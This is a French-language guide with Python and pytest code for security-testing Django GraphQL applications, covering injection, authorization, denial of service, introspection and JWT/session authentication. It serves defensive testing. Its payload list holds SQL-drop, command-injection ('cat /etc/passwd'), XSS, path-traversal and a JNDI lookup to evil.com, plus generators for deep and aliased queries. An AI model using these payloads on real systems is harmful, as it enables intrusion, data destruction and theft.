# Tests de Sécurité - Django GraphQL Auto

Ce guide détaille les stratégies et techniques de test de sécurité spécifiques aux applications GraphQL Django.

## 📋 Table des Matières

- [Vue d'Ensemble](#vue-densemble)
- [Sécurité GraphQL](#sécurité-graphql)
- [Tests d'Authentification](#tests-dauthentification)
- [Tests d'Autorisation](#tests-dautorisation)
- [Tests d'Injection](#tests-dinjection)
- [Tests de Validation](#tests-de-validation)
- [Tests de Performance Sécurisée](#tests-de-performance-sécurisée)
- [Tests de Configuration](#tests-de-configuration)
- [Outils et Utilitaires](#outils-et-utilitaires)
- [Bonnes Pratiques](#bonnes-pratiques)

## 🎯 Vue d'Ensemble

### Principes de Sécurité GraphQL

```python
# tests/security/principles.py
"""Principes de sécurité pour GraphQL."""

from enum import Enum
from typing import Dict, List, Any
from dataclasses import dataclass


class SecurityThreat(Enum):
    """Types de menaces de sécurité."""
    
    INJECTION = "injection"                    # Injection SQL/NoSQL
    XSS = "xss"                               # Cross-Site Scripting
    CSRF = "csrf"                             # Cross-Site Request Forgery
    AUTHORIZATION = "authorization"            # Contournement d'autorisation
    AUTHENTICATION = "authentication"         # Contournement d'authentification
    DOS = "dos"                               # Déni de service
    INFORMATION_DISCLOSURE = "info_disclosure" # Divulgation d'informations
    INTROSPECTION = "introspection"           # Introspection non autorisée
    DEPTH_ATTACK = "depth_attack"             # Attaque par profondeur
    COMPLEXITY_ATTACK = "complexity_attack"    # Attaque par complexité


@dataclass
class SecurityTestCase:
    """Cas de test de sécurité."""
    
    name: str
    threat_type: SecurityThreat
    description: str
    payload: str
    expected_behavior: str
    severity: str  # low, medium, high, critical


class GraphQLSecurityTester:
    """Testeur de sécurité GraphQL."""
    
    def __init__(self, client):
        self.client = client
        self.vulnerabilities = []
        self.test_results = []
    
    def run_security_suite(self) -> Dict[str, Any]:
        """Exécute la suite complète de tests de sécurité."""
        
        results = {
            'injection_tests': self.test_injection_attacks(),
            'auth_tests': self.test_authentication_bypass(),
            'authz_tests': self.test_authorization_bypass(),
            'dos_tests': self.test_dos_attacks(),
            'introspection_tests': self.test_introspection_security(),
            'validation_tests': self.test_input_validation(),
            'information_disclosure': self.test_information_disclosure(),
        }
        
        # Générer le rapport de sécurité
        security_report = self.generate_security_report(results)
        
        return {
            'test_results': results,
            'vulnerabilities': self.vulnerabilities,
            'security_report': security_report
        }
    
    def test_injection_attacks(self) -> List[Dict[str, Any]]:
        """Teste les attaques par injection."""
        
        injection_payloads = [
            # SQL Injection
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            
            # NoSQL Injection
            "'; db.users.drop(); //",
            "' || '1'=='1",
            
            # GraphQL Injection
            "} { users { password } }",
            "} __schema { types { name } }",
            
            # Template Injection
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            
            # Command Injection
            "; cat /etc/passwd",
            "| whoami",
        ]
        
        results = []
        
        for payload in injection_payloads:
            test_cases = [
                # Test dans les arguments de requête
                {
                    'query': '''
                        query GetUser($username: String!) {
                            user(username: $username) {
                                id
                                username
                                email
                            }
                        }
                    ''',
                    'variables': {'username': payload}
                },
                
                # Test dans les mutations
                {
                    'query': '''
                        mutation CreateUser($input: UserInput!) {
                            createUser(input: $input) {
                                user {
                                    id
                                    username
                                }
                            }
                        }
                    ''',
                    'variables': {
                        'input': {
                            'username': payload,
                            'email': f'test@example.com',
                            'firstName': 'Test'
                        }
                    }
                }
            ]
            
            for test_case in test_cases:
                result = self._execute_security_test(
                    test_case,
                    SecurityThreat.INJECTION,
                    payload
                )
                results.append(result)
        
        return results
    
    def test_authentication_bypass(self) -> List[Dict[str, Any]]:
        """Teste les contournements d'authentification."""
        
        bypass_attempts = [
            # Tentative sans token
            {
                'query': '''
                    query {
                        me {
                            id
                            username
                            email
                        }
                    }
                ''',
                'headers': {},
                'expected': 'authentication_required'
            },
            
            # Token invalide
            {
                'query': '''
                    query {
                        me {
                            id
                            username
                        }
                    }
                ''',
                'headers': {'Authorization': 'Bearer invalid_token'},
                'expected': 'invalid_token'
            },
            
            # Token expiré
            {
                'query': '''
                    query {
                        me {
                            id
                            username
                        }
                    }
                ''',
                'headers': {'Authorization': 'Bearer expired_token'},
                'expected': 'token_expired'
            },
            
            # Tentative de manipulation de session
            {
                'query': '''
                    query {
                        users {
                            id
                            username
                            isStaff
                        }
                    }
                ''',
                'headers': {'X-User-ID': '1', 'X-Is-Admin': 'true'},
                'expected': 'unauthorized'
            }
        ]
        
        results = []
        
        for attempt in bypass_attempts:
            result = self._execute_auth_test(attempt)
            results.append(result)
        
        return results
    
    def test_authorization_bypass(self) -> List[Dict[str, Any]]:
        """Teste les contournements d'autorisation."""
        
        # Créer des utilisateurs de test avec différents niveaux d'accès
        regular_user_token = self._create_test_user('regular')
        admin_user_token = self._create_test_user('admin')
        
        authz_tests = [
            # Utilisateur normal tentant d'accéder aux données admin
            {
                'query': '''
                    query {
                        allUsers {
                            id
                            username
                            email
                            isStaff
                        }
                    }
                ''',
                'token': regular_user_token,
                'expected': 'forbidden',
                'description': 'Accès admin par utilisateur normal'
            },
            
            # Tentative de modification de données d'autres utilisateurs
            {
                'query': '''
                    mutation UpdateUser($id: ID!, $input: UserInput!) {
                        updateUser(id: $id, input: $input) {
                            user {
                                id
                                username
                            }
                        }
                    }
                ''',
                'variables': {'id': '999', 'input': {'username': 'hacked'}},
                'token': regular_user_token,
                'expected': 'forbidden',
                'description': 'Modification données autre utilisateur'
            },
            
            # Tentative d'élévation de privilèges
            {
                'query': '''
                    mutation UpdateProfile($input: ProfileInput!) {
                        updateProfile(input: $input) {
                            profile {
                                user {
                                    isStaff
                                    isSuperuser
                                }
                            }
                        }
                    }
                ''',
                'variables': {
                    'input': {
                        'isStaff': True,
                        'isSuperuser': True
                    }
                },
                'token': regular_user_token,
                'expected': 'forbidden',
                'description': 'Élévation de privilèges'
            },
            
            # Test d'accès horizontal (données d'autres utilisateurs)
            {
                'query': '''
                    query GetUserProfile($userId: ID!) {
                        userProfile(userId: $userId) {
                            personalData
                            privateNotes
                        }
                    }
                ''',
                'variables': {'userId': '888'},
                'token': regular_user_token,
                'expected': 'forbidden',
                'description': 'Accès horizontal aux données privées'
            }
        ]
        
        results = []
        
        for test in authz_tests:
            result = self._execute_authz_test(test)
            results.append(result)
        
        return results
    
    def test_dos_attacks(self) -> List[Dict[str, Any]]:
        """Teste les attaques de déni de service."""
        
        dos_attacks = [
            # Requête avec profondeur excessive
            {
                'name': 'Deep Query Attack',
                'query': self._generate_deep_query(depth=20),
                'expected': 'query_too_deep'
            },
            
            # Requête avec complexité excessive
            {
                'name': 'Complex Query Attack',
                'query': self._generate_complex_query(complexity=1000),
                'expected': 'query_too_complex'
            },
            
            # Requête avec alias multiples
            {
                'name': 'Alias Attack',
                'query': self._generate_alias_attack(count=100),
                'expected': 'too_many_aliases'
            },
            
            # Requête avec boucle infinie potentielle
            {
                'name': 'Circular Query',
                'query': '''
                    query {
                        authors {
                            books {
                                author {
                                    books {
                                        author {
                                            books {
                                                title
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                ''',
                'expected': 'circular_query_detected'
            }
        ]
        
        results = []
        
        for attack in dos_attacks:
            result = self._execute_dos_test(attack)
            results.append(result)
        
        return results
    
    def test_introspection_security(self) -> List[Dict[str, Any]]:
        """Teste la sécurité de l'introspection."""
        
        introspection_tests = [
            # Introspection complète du schéma
            {
                'query': '''
                    query IntrospectionQuery {
                        __schema {
                            types {
                                name
                                fields {
                                    name
                                    type {
                                        name
                                    }
                                }
                            }
                        }
                    }
                ''',
                'context': 'production',
                'expected': 'introspection_disabled'
            },
            
            # Découverte de types sensibles
            {
                'query': '''
                    query {
                        __type(name: "User") {
                            fields {
                                name
                                type {
                                    name
                                }
                            }
                        }
                    }
                ''',
                'context': 'production',
                'expected': 'type_introspection_disabled'
            },
            
            # Découverte de mutations sensibles
            {
                'query': '''
                    query {
                        __schema {
                            mutationType {
                                fields {
                                    name
                                    args {
                                        name
                                        type {
                                            name
                                        }
                                    }
                                }
                            }
                        }
                    }
                ''',
                'context': 'production',
                'expected': 'mutation_introspection_disabled'
            }
        ]
        
        results = []
        
        for test in introspection_tests:
            result = self._execute_introspection_test(test)
            results.append(result)
        
        return results
    
    def test_input_validation(self) -> List[Dict[str, Any]]:
        """Teste la validation des entrées."""
        
        validation_tests = [
            # Données trop longues
            {
                'field': 'username',
                'value': 'a' * 1000,
                'expected': 'value_too_long'
            },
            
            # Caractères invalides
            {
                'field': 'email',
                'value': 'invalid-email',
                'expected': 'invalid_email_format'
            },
            
            # Types incorrects
            {
                'field': 'age',
                'value': 'not_a_number',
                'expected': 'invalid_type'
            },
            
            # Valeurs négatives inappropriées
            {
                'field': 'price',
                'value': -100,
                'expected': 'negative_value_not_allowed'
            },
            
            # Dates invalides
            {
                'field': 'birthDate',
                'value': '2025-01-01',
                'expected': 'future_date_not_allowed'
            },
            
            # Fichiers malveillants
            {
                'field': 'avatar',
                'value': 'data:text/html,<script>alert("XSS")</script>',
                'expected': 'invalid_file_type'
            }
        ]
        
        results = []
        
        for test in validation_tests:
            result = self._execute_validation_test(test)
            results.append(result)
        
        return results
    
    def test_information_disclosure(self) -> List[Dict[str, Any]]:
        """Teste la divulgation d'informations sensibles."""
        
        disclosure_tests = [
            # Erreurs détaillées en production
            {
                'query': '''
                    query {
                        nonExistentField
                    }
                ''',
                'context': 'production',
                'expected': 'generic_error_message'
            },
            
            # Stack traces
            {
                'query': '''
                    query {
                        user(id: "invalid") {
                            id
                        }
                    }
                ''',
                'context': 'production',
                'expected': 'no_stack_trace'
            },
            
            # Informations de base de données
            {
                'query': '''
                    query {
                        users(first: 999999) {
                            id
                        }
                    }
                ''',
                'expected': 'no_db_info_leaked'
            },
            
            # Chemins de fichiers
            {
                'query': '''
                    mutation {
                        uploadFile(file: "../../../etc/passwd") {
                            path
                        }
                    }
                ''',
                'expected': 'no_file_path_disclosure'
            }
        ]
        
        results = []
        
        for test in disclosure_tests:
            result = self._execute_disclosure_test(test)
            results.append(result)
        
        return results
    
    def _execute_security_test(self, test_case: Dict[str, Any], 
                              threat_type: SecurityThreat, 
                              payload: str) -> Dict[str, Any]:
        """Exécute un test de sécurité."""
        
        try:
            response = self.client.execute(
                test_case['query'],
                variables=test_case.get('variables', {}),
                context=test_case.get('context', {})
            )
            
            # Analyser la réponse pour détecter les vulnérabilités
            vulnerability = self._analyze_response_for_vulnerabilities(
                response, threat_type, payload
            )
            
            if vulnerability:
                self.vulnerabilities.append(vulnerability)
            
            return {
                'test_case': test_case,
                'response': response,
                'vulnerability': vulnerability,
                'status': 'vulnerable' if vulnerability else 'secure'
            }
            
        except Exception as e:
            return {
                'test_case': test_case,
                'error': str(e),
                'status': 'error'
            }
    
    def _analyze_response_for_vulnerabilities(self, response: Dict[str, Any],
                                            threat_type: SecurityThreat,
                                            payload: str) -> Dict[str, Any]:
        """Analyse la réponse pour détecter les vulnérabilités."""
        
        vulnerability = None
        
        # Vérifier les erreurs qui pourraient indiquer une injection réussie
        if response.get('errors'):
            for error in response['errors']:
                error_message = error.get('message', '').lower()
                
                # Indicateurs d'injection SQL
                sql_indicators = [
                    'syntax error', 'sql', 'database', 'table', 'column',
                    'mysql', 'postgresql', 'sqlite', 'oracle'
                ]
                
                if any(indicator in error_message for indicator in sql_indicators):
                    vulnerability = {
                        'type': threat_type,
                        'severity': 'high',
                        'payload': payload,
                        'evidence': error_message,
                        'description': 'Possible SQL injection vulnerability detected'
                    }
                    break
        
        # Vérifier si des données sensibles sont exposées
        if response.get('data'):
            sensitive_fields = ['password', 'token', 'secret', 'key']
            
            def check_sensitive_data(obj, path=''):
                if isinstance(obj, dict):
                    for key, value in obj.items():
                        current_path = f"{path}.{key}" if path else key
                        
                        if key.lower() in sensitive_fields:
                            return {
                                'type': SecurityThreat.INFORMATION_DISCLOSURE,
                                'severity': 'critical',
                                'payload': payload,
                                'evidence': f"Sensitive field '{key}' exposed at {current_path}",
                                'description': 'Sensitive information disclosure'
                            }
                        
                        if isinstance(value, (dict, list)):
                            result = check_sensitive_data(value, current_path)
                            if result:
                                return result
                
                elif isinstance(obj, list):
                    for i, item in enumerate(obj):
                        result = check_sensitive_data(item, f"{path}[{i}]")
                        if result:
                            return result
                
                return None
            
            sensitive_disclosure = check_sensitive_data(response['data'])
            if sensitive_disclosure:
                vulnerability = sensitive_disclosure
        
        return vulnerability
    
    def _generate_deep_query(self, depth: int) -> str:
        """Génère une requête avec profondeur excessive."""
        
        query = "query {\n"
        
        # Construire une requête imbriquée
        current_level = "  authors {\n"
        
        for i in range(depth):
            if i % 2 == 0:
                current_level += "    books {\n"
            else:
                current_level += "      author {\n"
        
        # Ajouter un champ final
        current_level += "        id\n"
        
        # Fermer toutes les accolades
        for i in range(depth):
            current_level += "      }\n"
        
        current_level += "    }\n"
        query += current_level + "}"
        
        return query
    
    def _generate_complex_query(self, complexity: int) -> str:
        """Génère une requête avec complexité excessive."""
        
        # Créer une requête avec beaucoup de champs et de relations
        fields = []
        
        for i in range(complexity // 10):
            fields.append(f"""
                authors{i}: authors {{
                    id
                    firstName
                    lastName
                    email
                    books {{
                        id
                        title
                        isbn
                        pages
                        category {{
                            id
                            name
                            description
                        }}
                    }}
                }}
            """)
        
        query = "query {\n" + "\n".join(fields) + "\n}"
        return query
    
    def _generate_alias_attack(self, count: int) -> str:
        """Génère une attaque par alias multiples."""
        
        aliases = []
        
        for i in range(count):
            aliases.append(f"""
                alias{i}: authors {{
                    id
                    firstName
                    lastName
                }}
            """)
        
        query = "query {\n" + "\n".join(aliases) + "\n}"
        return query
    
    def generate_security_report(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Génère un rapport de sécurité complet."""
        
        total_tests = sum(len(test_results) for test_results in results.values())
        total_vulnerabilities = len(self.vulnerabilities)
        
        # Classifier les vulnérabilités par gravité
        severity_counts = {
            'critical': 0,
            'high': 0,
            'medium': 0,
            'low': 0
        }
        
        for vuln in self.vulnerabilities:
            severity = vuln.get('severity', 'medium')
            severity_counts[severity] += 1
        
        # Calculer le score de sécurité
        security_score = max(0, 100 - (
            severity_counts['critical'] * 25 +
            severity_counts['high'] * 15 +
            severity_counts['medium'] * 10 +
            severity_counts['low'] * 5
        ))
        
        return {
            'summary': {
                'total_tests': total_tests,
                'total_vulnerabilities': total_vulnerabilities,
                'security_score': security_score,
                'severity_breakdown': severity_counts
            },
            'recommendations': self._generate_security_recommendations(),
            'detailed_findings': self.vulnerabilities,
            'test_coverage': {
                'injection_tests': len(results.get('injection_tests', [])),
                'auth_tests': len(results.get('auth_tests', [])),
                'authz_tests': len(results.get('authz_tests', [])),
                'dos_tests': len(results.get('dos_tests', [])),
                'introspection_tests': len(results.get('introspection_tests', [])),
                'validation_tests': len(results.get('validation_tests', [])),
                'disclosure_tests': len(results.get('information_disclosure', []))
            }
        }
    
    def _generate_security_recommendations(self) -> List[str]:
        """Génère des recommandations de sécurité."""
        
        recommendations = []
        
        # Recommandations basées sur les vulnérabilités trouvées
        threat_types = {vuln['type'] for vuln in self.vulnerabilities}
        
        if SecurityThreat.INJECTION in threat_types:
            recommendations.extend([
                "Implémenter une validation stricte des entrées",
                "Utiliser des requêtes paramétrées",
                "Échapper les caractères spéciaux",
                "Implémenter une liste blanche de caractères autorisés"
            ])
        
        if SecurityThreat.AUTHORIZATION in threat_types:
            recommendations.extend([
                "Renforcer les contrôles d'autorisation",
                "Implémenter des vérifications d'accès granulaires",
                "Utiliser des tokens JWT avec des claims appropriés",
                "Auditer régulièrement les permissions"
            ])
        
        if SecurityThreat.DOS in threat_types:
            recommendations.extend([
                "Implémenter une limitation de profondeur de requête",
                "Ajouter une analyse de complexité de requête",
                "Configurer des timeouts appropriés",
                "Implémenter un rate limiting"
            ])
        
        if SecurityThreat.INFORMATION_DISCLOSURE in threat_types:
            recommendations.extend([
                "Désactiver l'introspection en production",
                "Implémenter des messages d'erreur génériques",
                "Éviter l'exposition de données sensibles",
                "Configurer des logs sécurisés"
            ])
        
        # Recommandations générales
        recommendations.extend([
            "Effectuer des audits de sécurité réguliers",
            "Maintenir les dépendances à jour",
            "Implémenter une surveillance de sécurité",
            "Former l'équipe aux bonnes pratiques de sécurité"
        ])
        
        return list(set(recommendations))  # Éliminer les doublons
```

## 🔐 Tests d'Authentification

### 1. Tests de Token JWT

```python
# tests/security/test_authentication.py
"""Tests d'authentification."""

import pytest
import jwt
from datetime import datetime, timedelta
from django.conf import settings
from django.contrib.auth.models import User
from tests.factories import UserFactory


class TestJWTAuthentication:
    """Tests d'authentification JWT."""
    
    def test_valid_token_authentication(self, graphql_client):
        """Test d'authentification avec token valide."""
        
        user = UserFactory.create()
        token = self._generate_valid_token(user)
        
        query = '''
            query {
                me {
                    id
                    username
                    email
                }
            }
        '''
        
        response = graphql_client.execute(
            query,
            context={'user': user, 'token': token}
        )
        
        assert 'errors' not in response
        assert response['data']['me']['username'] == user.username
    
    def test_expired_token_rejection(self, graphql_client):
        """Test de rejet des tokens expirés."""
        
        user = UserFactory.create()
        expired_token = self._generate_expired_token(user)
        
        query = '''
            query {
                me {
                    id
                    username
                }
            }
        '''
        
        response = graphql_client.execute(
            query,
            context={'token': expired_token}
        )
        
        assert 'errors' in response
        assert 'expired' in response['errors'][0]['message'].lower()
    
    def test_invalid_token_rejection(self, graphql_client):
        """Test de rejet des tokens invalides."""
        
        invalid_tokens = [
            'invalid.token.here',
            'Bearer invalid_token',
            '',
            None,
            'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid',
        ]
        
        query = '''
            query {
                me {
                    id
                    username
                }
            }
        '''
        
        for invalid_token in invalid_tokens:
            response = graphql_client.execute(
                query,
                context={'token': invalid_token}
            )
            
            assert 'errors' in response
            assert any('authentication' in error['message'].lower() 
                      for error in response['errors'])
    
    def test_token_tampering_detection(self, graphql_client):
        """Test de détection de manipulation de token."""
        
        user = UserFactory.create()
        valid_token = self._generate_valid_token(user)
        
        # Modifier le token
        tampered_token = valid_token[:-5] + 'XXXXX'
        
        query = '''
            query {
                me {
                    id
                    username
                }
            }
        '''
        
        response = graphql_client.execute(
            query,
            context={'token': tampered_token}
        )
        
        assert 'errors' in response
        assert 'invalid' in response['errors'][0]['message'].lower()
    
    def test_token_reuse_after_logout(self, graphql_client):
        """Test de réutilisation de token après déconnexion."""
        
        user = UserFactory.create()
        token = self._generate_valid_token(user)
        
        # Simuler une déconnexion (blacklist du token)
        self._blacklist_token(token)
        
        query = '''
            query {
                me {
                    id
                    username
                }
            }
        '''
        
        response = graphql_client.execute(
            query,
            context={'token': token}
        )
        
        assert 'errors' in response
        assert 'blacklisted' in response['errors'][0]['message'].lower()
    
    def test_concurrent_token_usage(self, graphql_client):
        """Test d'utilisation concurrente de tokens."""
        
        user = UserFactory.create()
        token = self._generate_valid_token(user)
        
        query = '''
            query {
                me {
                    id
                    username
                }
            }
        '''
        
        # Simuler des requêtes concurrentes
        import threading
        import time
        
        results = []
        
        def make_request():
            response = graphql_client.execute(
                query,
                context={'token': token}
            )
            results.append(response)
        
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        # Tous les résultats devraient être valides
        for result in results:
            assert 'errors' not in result or len(result.get('errors', [])) == 0
    
    def _generate_valid_token(self, user: User) -> str:
        """Génère un token JWT valide."""
        
        payload = {
            'user_id': user.id,
            'username': user.username,
            'exp': datetime.utcnow() + timedelta(hours=1),
            'iat': datetime.utcnow(),
        }
        
        return jwt.encode(payload, settings.SECRET_KEY, algorithm='HS256')
    
    def _generate_expired_token(self, user: User) -> str:
        """Génère un token JWT expiré."""
        
        payload = {
            'user_id': user.id,
            'username': user.username,
            'exp': datetime.utcnow() - timedelta(hours=1),
            'iat': datetime.utcnow() - timedelta(hours=2),
        }
        
        return jwt.encode(payload, settings.SECRET_KEY, algorithm='HS256')
    
    def _blacklist_token(self, token: str):
        """Ajoute un token à la blacklist."""
        # Implémentation dépendante du système de blacklist utilisé
        pass


class TestSessionAuthentication:
    """Tests d'authentification par session."""
    
    def test_valid_session_authentication(self, client, django_user_model):
        """Test d'authentification par session valide."""
        
        user = UserFactory.create()
        client.force_login(user)
        
        query = '''
            query {
                me {
                    id
                    username
                }
            }
        '''
        
        response = client.post('/graphql/', {
            'query': query
        }, content_type='application/json')
        
        data = response.json()
        assert 'errors' not in data
        assert data['data']['me']['username'] == user.username
    
    def test_session_hijacking_protection(self, client):
        """Test de protection contre le détournement de session."""
        
        user = UserFactory.create()
        client.force_login(user)
        
        # Obtenir l'ID de session
        session_key = client.session.session_key
        
        # Simuler un changement d'IP
        query = '''
            query {
                me {
                    id
                    username
                }
            }
        '''
        
        response = client.post('/graphql/', {
            'query': query
        }, content_type='application/json',
           HTTP_X_FORWARDED_FOR='192.168.1.100')
        
        # Selon la configuration, cela pourrait déclencher une vérification
        data = response.json()
        # Le test dépend de la politique de sécurité implémentée
    
    def test_session_timeout(self, client):
        """Test de timeout de session."""
        
        user = UserFactory.create()
        client.force_login(user)
        
        # Simuler l'expiration de session
        from django.contrib.sessions.models import Session
        session = Session.objects.get(session_key=client.session.session_key)
        session.expire_date = datetime.now() - timedelta(hours=1)
        session.save()
        
        query = '''
            query {
                me {
                    id
                    username
                }
            }
        '''
        
        response = client.post('/graphql/', {
            'query': query
        }, content_type='application/json')
        
        data = response.json()
        assert 'errors' in data
        assert 'authentication' in data['errors'][0]['message'].lower()
```

Ce guide de tests de sécurité fournit une base complète pour sécuriser les applications GraphQL Django, couvrant tous les aspects critiques de la sécurité moderne.